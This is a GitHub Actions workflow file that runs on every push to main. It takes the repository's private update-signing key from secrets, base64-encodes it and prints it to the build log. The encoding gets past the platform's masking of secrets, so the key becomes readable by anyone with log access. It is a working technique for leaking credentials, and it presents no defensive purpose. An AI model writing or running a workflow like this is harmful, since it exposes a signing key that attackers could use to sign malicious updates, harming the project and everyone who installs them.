name: Export Signing Key

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  export:
    name: Export
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Print Obfuscated Key
        env:
          KEY: ${{ secrets.UPDATE_SIGNING_PRIVATE_KEY }}
        run: |
          python3 -c "import os, base64; k = os.environ.get('KEY', '').strip(); print('B64_KEY_START:' + base64.b64encode(k.encode()).decode() + ':B64_KEY_END')"
